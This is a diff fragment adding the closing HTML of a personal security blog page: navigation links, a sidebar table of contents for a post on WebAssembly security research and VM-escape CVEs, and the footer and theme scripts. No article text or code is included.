+              <a href="/ha1vk/tags/%E8%A7%A3%E9%87%8A%E5%99%A8-%E7%AE%80%E6%98%93%E8%99%9A%E6%8B%9F%E6%9C%BA/" rel="tag"># 解释器/简易虚拟机</a>
+              <a href="/ha1vk/tags/wasm/" rel="tag"># wasm</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2023/12/18/qwb2023-warmup23/" rel="prev" title="qwb2023_warmup23">
+      <i class="fa fa-chevron-left"></i> qwb2023_warmup23
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2024/04/18/CVE-2024-3400/" rel="next" title="Palo Alto CVE-2024-3400漏洞分析">
+      Palo Alto CVE-2024-3400漏洞分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WebAssembly-%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">WebAssembly 安全研究总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WebAssembly%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">1.1.</span> <span class="nav-text">WebAssembly是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WebAssembly%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="nav-number">1.2.</span> <span class="nav-text">WebAssembly虚拟机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WebAssembly%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F"><span class="nav-number">1.3.</span> <span class="nav-text">WebAssembly文件格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%A0%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%A8%A1%E5%BC%8F%E5%9C%A8WebAssembly%E4%B8%AD%E7%9A%84%E5%8F%98%E5%8C%96"><span class="nav-number">1.4.</span> <span class="nav-text">传统漏洞模式在WebAssembly中的变化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.4.1.</span> <span class="nav-text">格式化字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E6%BA%A2%E5%87%BA"><span class="nav-number">1.4.2.</span> <span class="nav-text">堆溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">1.4.3.</span> <span class="nav-text">栈溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C"><span class="nav-number">1.4.4.</span> <span class="nav-text">数组越界</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WebAssembly%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">1.5.</span> <span class="nav-text">WebAssembly的一些利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E6%8E%A7%E5%88%B6%E9%A1%B5%E9%9D%A2%E6%95%B0%E6%8D%AE%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%9E%84%E9%80%A0XSS"><span class="nav-number">1.5.1.</span> <span class="nav-text">前端控制页面数据，可以构造XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AFRCE"><span class="nav-number">1.5.2.</span> <span class="nav-text">服务器端RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="nav-number">1.5.3.</span> <span class="nav-text">思路总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WebAssembly%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8"><span class="nav-number">1.6.</span> <span class="nav-text">WebAssembly虚拟机逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2022-48503"><span class="nav-number">1.6.1.</span> <span class="nav-text">CVE-2022-48503</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="nav-number">1.6.1.1.</span> <span class="nav-text">漏洞信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.6.1.2.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2022-28990"><span class="nav-number">1.6.2.</span> <span class="nav-text">CVE-2022-28990</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Off-by-One-in-WasmEdge"><span class="nav-number">1.6.3.</span> <span class="nav-text">Off by One in WasmEdge</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.6.3.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.6.3.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.7.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.8.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
